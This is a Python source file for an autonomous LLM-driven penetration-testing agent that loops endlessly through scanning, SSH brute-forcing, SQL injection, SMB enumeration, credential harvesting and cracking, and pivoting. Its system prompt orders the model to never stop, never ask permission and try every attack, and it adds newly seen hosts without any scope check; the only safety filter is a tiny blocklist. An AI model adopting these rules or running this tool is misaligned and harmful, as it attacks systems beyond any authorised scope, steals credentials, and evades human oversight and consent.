"""Relentless Agent - NEVER STOPS. Keeps going until manually killed."""

import asyncio
import json
import os
import signal
from datetime import datetime
from typing import Optional

from ai.autonomous_executor import AutonomousExecutor, CommandResult
from ai.llm_client import LLMClient
from ai.streaming import StreamPrinter
from ai.context_compressor import ContextCompressor
from ai.credential_cracker import CredentialCracker
from ai.shell_generator import ShellGenerator
from core.session import SessionManager


class RelentlessAgent:
    """Autonomous agent that NEVER stops.

    Give it a target. It keeps going:
    - Scanning
    - Enumerating
    - Exploiting
    - Pivoting
    - Harvesting
    - Reporting

    If something fails → tries something else.
    If nothing found → digs deeper.
    If access gained → goes deeper.
    If pivoted → scans new network.
    NEVER STOPS until killed.
    """

    def __init__(self, llm: Optional[LLMClient] = None, resume_session: str = None):
        self.executor = AutonomousExecutor(timeout=300)
        self.llm = llm
        self.target = ""
        self.scope = ""
        self.cycle = 0
        self.session_id = resume_session or datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_dir = f"/tmp/penai_{self.session_id}"
        self._running = True

        # New components
        self.printer = StreamPrinter(delay=0.005)
        self.compressor = ContextCompressor(max_tokens=6000)
        self.cracker = CredentialCracker()
        self.shells = ShellGenerator()
        self.session_mgr = SessionManager()

        # State - everything we know
        self.known_hosts = set()
        self.known_services = {}  # ip: [port/service]
        self.known_vulns = []
        self.credentials = []
        self.access_map = {}  # ip -> access_level
        self.pivoted_networks = set()
        self.objectives_completed = []
        self.findings = []
        self.commands_run = []
        self.tools_installed = set()
        self.failed_attempts = set()  # Don't retry same failed thing
        self.phases_completed = set()

        # Resume if session provided
        if resume_session:
            self._load_session(resume_session)

    async def start(self, target: str, scope: Optional[str] = None):
        """Start the relentless agent. NEVER STOPS."""
        self.target = target
        self.scope = scope or target
        self.known_hosts.add(target)

        os.makedirs(self.log_dir, exist_ok=True)

        await self._print_banner_async()

        # Setup signal handler for graceful shutdown
        def signal_handler(sig, frame):
            self._running = False

        try:
            signal.signal(signal.SIGINT, signal_handler)
        except Exception:
            pass

        # === THE INFINITE LOOP ===
        while self._running:
            self.cycle += 1
            await self._print_cycle_async()

            try:
                # Get LLM's decision (with compressed context)
                decision = await self._think()

                # Parse and execute commands
                commands = self._extract_commands(decision)

                if commands:
                    for cmd in commands:
                        if not self._running:
                            break
                        result = await self._execute(cmd)
                        self._update_knowledge(cmd, result)

                        # Auto-crack any hashes found
                        if self.credentials:
                            await self.cracker.auto_crack(self.credentials)
                            cracked = self.cracker.get_cracked()
                            if cracked:
                                for c in cracked:
                                    if c not in self.credentials:
                                        self.credentials.append(c)
                                        await self.printer.stream_success(f"CRACKED: {c.get('password', '?')}")

                else:
                    await self._force_progress()

            except KeyboardInterrupt:
                self._running = False
            except Exception as e:
                await self.printer.stream_error(f"Cycle {self.cycle} error: {e}")
                await asyncio.sleep(1)

            # Auto-save every 5 cycles
            self.session_mgr.auto_save(self._get_state(), self.session_id, interval_cycles=5)
            self._save_state()

        await self._print_final_report_async()

    def _print_banner(self):
        print(f"""
{'='*70}
{' '*20}PEN-AI RELENTLESS AGENT v1.0
{'='*70}
  Target:    {self.target}
  Scope:     {self.scope}
  Session:   {self.session_id}
  Log Dir:   {self.log_dir}
  Mode:      INFINITE AUTONOMOUS OPERATION
{'='*70}

  [!] Agent will NEVER stop until you press Ctrl+C
  [!] It will keep scanning, enumerating, exploiting
  [!] It will install any tool it needs
  [!] It will try every possible attack vector

  Starting reconnaissance...
{'='*70}
""")

    async def _print_banner_async(self):
        banner = f"""
{'='*70}
{' '*20}PEN-AI RELENTLESS AGENT v1.0
{'='*70}
  Target:    {self.target}
  Scope:     {self.scope}
  Session:   {self.session_id}
  Mode:      INFINITE AUTONOMOUS OPERATION
{'='*70}
  [!] NEVER STOPS | NEVER ASKS PERMISSION | NEVER GIVES UP
{'='*70}
"""
        await self.printer.stream_banner(banner)

    async def _print_cycle_async(self):
        msg = f"CYCLE {self.cycle} | Hosts: {len(self.known_hosts)} | Services: {sum(len(v) for v in self.known_services.values())} | Creds: {len(self.credentials)} | Access: {len(self.access_map)}"
        await self.printer.stream_line(f"\n{'─'*60}\n  {msg}\n{'─'*60}\n", color="bold")

    async def _think(self) -> str:
        """Ask LLM what to do next. Uses compressed context."""
        # Compress state for LLM
        state = self._get_state()
        compressed = self.compressor.get_context(state)

        system_prompt = f"""You are PEN-AI, a RELENTLESS autonomous penetration tester. You NEVER STOP.

TARGET: {self.target}
SCOPE: {self.scope}
CYCLE: {self.cycle}

{compressed}

YOUR RULES:
1. NEVER STOP. Always have a next command.
2. NEVER ask for permission. Just do it.
3. NEVER give up. If something fails, try something ELSE.
4. ALWAYS go deeper.
5. Install tools yourself if needed: apt-get, pip, go install
6. Try EVERYTHING: nmap, gobuster, hydra, sqlmap, impacket, etc.
7. After exploitation, HARVEST credentials and PIVOT.
8. If nothing works, try: default creds, known CVEs, misconfigs, web vulns.
9. WRITE your exact commands in ```bash blocks.
10. Max 3 commands per cycle. Be efficient.

DECIDE WHAT TO DO NEXT."""

        context = f"Cycle {self.cycle}. What should I do next?"

        if self.llm:
            response = await self.llm.chat(
                system=system_prompt,
                messages=[{"role": "user", "content": context}]
            )
            return response
        else:
            return self._fallback_decide()

    def _fallback_decide(self) -> str:
        """Fallback when no LLM - deterministic pentesting."""
        # Phase 1: Discovery
        if not self.known_hosts or len(self.known_hosts) <= 1:
            return f"nmap -sn {self.target}"

        # Phase 2: Service enumeration on each host
        for host in self.known_hosts:
            if host not in self.known_services or len(self.known_services.get(host, [])) == 0:
                return f"nmap -sV -sC -p- {host}"

        # Phase 3: Exploit discovered services
        for host, services in self.known_services.items():
            for svc in services:
                port = svc.get("port", 0)
                name = svc.get("service", "")

                if name == "ssh" and f"ssh:{host}" not in self.failed_attempts:
                    return f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4"

                if name == "http" or name == "https":
                    if f"http_dir:{host}" not in self.failed_attempts:
                        return f"gobuster dir -u http://{host}:{port} -w /usr/share/wordlists/dirb/common.txt -q"
                    if f"sqli:{host}" not in self.failed_attempts:
                        return f"sqlmap -u http://{host}:{port}/ --batch --dbs --level=3 --risk=2"

                if "microsoft-ds" in name or "netbios" in name or port == 445:
                    if f"smb:{host}" not in self.failed_attempts:
                        return f"enum4linux -a {host}"

        # Phase 4: Pivot to new networks
        if self.credentials and not self.pivoted_networks:
            cred = self.credentials[0]
            host = list(self.access_map.keys())[0] if self.access_map else list(self.known_hosts)[0]
            return f"sshpass -p '{cred.get('password', '')}' ssh -o StrictHostKeyChecking=no {cred.get('username', 'root')}@{host} 'ip route && ip addr'"

        return f"echo 'Deep enumeration cycle {self.cycle}' && nmap -sV -sC -A -p- {self.target}"

    async def _execute(self, command: str) -> CommandResult:
        """Execute a command with streaming output."""
        await self.printer.stream_command(command[:150])

        result = await self.executor.run(command, timeout=300)

        if result.exit_code != 0:
            stderr = result.stderr.lower()
            if "not found" in stderr or "command not found" in stderr:
                tool = command.split()[0]
                if tool not in self.tools_installed:
                    await self.printer.stream_info(f"Installing '{tool}'...")
                    install_result = await self.executor.ensure_tool(tool)
                    if install_result:
                        self.tools_installed.add(tool)
                        await self.printer.stream_success(f"Installed '{tool}'. Retrying...")
                        result = await self.executor.run(command, timeout=300)

        if result.exit_code == 0:
            if result.stdout:
                await self.printer.stream_output(result.stdout, max_lines=15)
        else:
            await self.printer.stream_error(f"Failed (exit {result.exit_code})")
            self.failed_attempts.add(command[:80])

        self.commands_run.append(command)
        return result

    def _get_state(self) -> dict:
        """Get current state as dict."""
        return {
            "target": self.target,
            "cycle": self.cycle,
            "known_hosts": list(self.known_hosts),
            "known_services": self.known_services,
            "credentials": self.credentials,
            "access_map": self.access_map,
            "pivoted_networks": list(self.pivoted_networks),
            "failed_attempts": list(self.failed_attempts),
            "tools_installed": list(self.tools_installed),
            "commands_run": self.commands_run,
        }

    def _load_session(self, session_id: str):
        """Load a previous session."""
        state = self.session_mgr.load(session_id)
        if state:
            self.target = state.get("target", "")
            self.cycle = state.get("cycle", 0)
            self.known_hosts = set(state.get("known_hosts", []))
            self.known_services = state.get("known_services", {})
            self.credentials = state.get("credentials", [])
            self.access_map = state.get("access_map", {})
            self.pivoted_networks = set(state.get("pivoted_networks", []))
            self.failed_attempts = set(state.get("failed_attempts", []))
            self.tools_installed = set(state.get("tools_installed", []))
            self.commands_run = state.get("commands_run", [])

    def _update_knowledge(self, command: str, result: CommandResult):
        """Parse output and update everything we know."""
        output = result.stdout + result.stderr

        # Extract hosts from nmap
        import re
        hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)
        for h in hosts:
            self.known_hosts.add(h)

        # Extract services
        services = re.findall(r"(\d+)/(\w+)\s+open\s+(\S+)(?:\s+(.*))?", output)
        for port, proto, svc, ver in services:
            host = command.split()[-1] if command.split() else "unknown"
            # Try to find which host this is for
            for h in self.known_hosts:
                if h in command:
                    host = h
                    break
            if host not in self.known_services:
                self.known_services[host] = []
            svc_info = {"port": int(port), "service": svc, "version": ver.strip() if ver else ""}
            if svc_info not in self.known_services[host]:
                self.known_services[host].append(svc_info)
                print(f"  [+] NEW SERVICE: {host}:{port} ({svc} {ver})")

        # Extract credentials
        cred_patterns = [
            (r"password[=:]\s*(\S+)", "password"),
            (r"LOGIN:\s*(\S+)\s+PASSWORD:\s*(\S+)", "login"),
            (r"\$krb5tgs\$.*?\$", "kerberos"),
            (r"\$krb5asrep\$.*?\$", "asrep"),
            (r"(\d+:\d+:[a-f0-9]{32}:[a-f0-9]{32})", "ntlm"),
        ]
        for pattern, cred_type in cred_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            for match in matches:
                cred = {"type": cred_type, "value": match if isinstance(match, str) else match}
                if cred not in self.credentials:
                    self.credentials.append(cred)
                    print(f"  [!] NEW CREDENTIAL: {cred_type} = {str(match)[:50]}")

        # Detect access level
        if "uid=0" in output:
            for h in self.known_hosts:
                if h in command:
                    self.access_map[h] = "root"
                    print(f"  [!] ROOT ACCESS on {h}!")
        elif "uid=" in output:
            for h in self.known_hosts:
                if h in command:
                    self.access_map[h] = "user"

        # Detect new networks for pivoting
        routes = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", output)
        for route in routes:
            if route not in self.pivoted_networks and route != self.target:
                self.pivoted_networks.add(route)
                print(f"  [!] NEW NETWORK DISCOVERED: {route}")

    async def _force_progress(self):
        """When LLM gives no commands, force progress."""
        # Try to discover more
        if len(self.known_hosts) <= 1:
            await self._execute(f"nmap -sn {self.target}")
        else:
            # Pick a random host and do deep enum
            host = list(self.known_hosts)[0]
            await self._execute(f"nmap -sV -sC -A --script=vuln -p- {host}")

    def _extract_commands(self, text: str) -> list[str]:
        """Extract commands from LLM response."""
        commands = []
        in_block = False
        current = []

        for line in text.split("\n"):
            stripped = line.strip()

            if stripped.startswith("```"):
                if in_block:
                    if current:
                        cmd = " ".join(current)
                        if self._is_valid(cmd):
                            commands.append(cmd)
                    current = []
                in_block = not in_block
                continue

            if in_block and stripped:
                if stripped.endswith("\\"):
                    current.append(stripped[:-1])
                else:
                    current.append(stripped)
                    cmd = " ".join(current)
                    if self._is_valid(cmd):
                        commands.append(cmd)
                    current = []

        # Also extract inline commands from lines with command prefixes
        cmd_starts = [
            "nmap ", "gobuster ", "ffuf ", "nikto ", "sqlmap ", "enum4linux",
            "smbclient ", "ldapsearch ", "hydra ", "medusa ", "john ",
            "curl ", "wget ", "sshpass ", "ssh ", "python3 ", "pip ",
            "apt-get ", "apt install ", "msfconsole", "msfvenom",
            "chisel ", "ligolo ", "binwalk ", "checksec ", "gdb ",
            "strings ", "objdump ", "nm ", "readelf ",
            "docker ", "systemctl ", "service ",
            "cat ", "grep ", "find ", "ls ", "id ", "whoami",
            "uname ", "ifconfig", "ip ", "netstat ", "ss ", "ps ",
            "nc ", "socat ", "netcat",
            "echo ", "chmod ", "mkdir ", "cp ", "mv ",
            "go install", "git clone",
        ]
        for line in text.split("\n"):
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or stripped.startswith("["):
                continue
            if any(stripped.startswith(p) for p in cmd_starts):
                if stripped not in commands and self._is_valid(stripped):
                    commands.append(stripped)
            # Also check for commands after common separators
            for sep in [": ", "Run ", "Execute ", "use ", "-> ", ">$ "]:
                if sep in stripped:
                    idx = stripped.index(sep) + len(sep)
                    potential = stripped[idx:].strip().strip('"').strip("'")
                    if any(potential.startswith(p) for p in cmd_starts):
                        if potential not in commands and self._is_valid(potential):
                            commands.append(potential)

        return commands[:5]  # Max 5 commands per cycle

    def _is_valid(self, cmd: str) -> bool:
        """Quick safety check."""
        bad = ["rm -rf /", "rm -rf /*", "mkfs", ":(){:|:&};:"]
        return not any(b in cmd for b in bad)

    def _save_state(self):
        """Save state to disk so we can resume."""
        state = {
            "session_id": self.session_id,
            "target": self.target,
            "cycle": self.cycle,
            "hosts": list(self.known_hosts),
            "services": self.known_services,
            "credentials": self.credentials,
            "access_map": self.access_map,
            "pivoted_networks": list(self.pivoted_networks),
            "commands_run": len(self.commands_run),
            "tools_installed": list(self.tools_installed),
            "failed_attempts": list(self.failed_attempts),
            "saved_at": datetime.now().isoformat(),
        }
        state_file = os.path.join(self.log_dir, "state.json")
        with open(state_file, "w") as f:
            json.dump(state, f, indent=2, default=str)

    async def _print_final_report_async(self):
        """Print the final report when stopped."""
        report = f"""
{'='*70}
{' '*20}FINAL REPORT
{'='*70}
  Session:        {self.session_id}
  Total Cycles:   {self.cycle}
  Commands Run:   {len(self.commands_run)}
  Hosts Found:    {len(self.known_hosts)}
  Services Found: {sum(len(v) for v in self.known_services.values())}
  Credentials:    {len(self.credentials)}
  Access Levels:  {self.access_map}
  Networks:       {list(self.pivoted_networks)}
  Tools Installed:{list(self.tools_installed)}
{'='*70}"""
        await self.printer.stream_banner(report)

        if self.credentials:
            await self.printer.stream_line("\n  CREDENTIALS FOUND:\n", color="yellow")
            for cred in self.credentials:
                val = str(cred.get('value', ''))[:80]
                await self.printer.stream_line(f"    [{cred.get('type', '?')}] {val}\n", color="green")

        if self.access_map:
            await self.printer.stream_line("\n  ACCESS GAINED:\n", color="yellow")
            for host, level in self.access_map.items():
                await self.printer.stream_line(f"    {host}: {level}\n", color="red")

        if self.known_services:
            await self.printer.stream_line("\n  SERVICES DISCOVERED:\n", color="yellow")
            for host, services in self.known_services.items():
                for svc in services:
                    await self.printer.stream_line(f"    {host}:{svc.get('port', '?')} ({svc.get('service', '?')} {svc.get('version', '')})\n", color="cyan")

        # Save final report
        report_file = os.path.join(self.log_dir, "report.json")
        with open(report_file, "w") as f:
            json.dump(self._get_state(), f, indent=2, default=str)
        await self.printer.stream_info(f"Report saved to: {report_file}")
        await self.printer.stream_info(f"Session saved: {self.session_id}")
        await self.printer.stream_line(f"\n{'='*70}\n", color="bold")
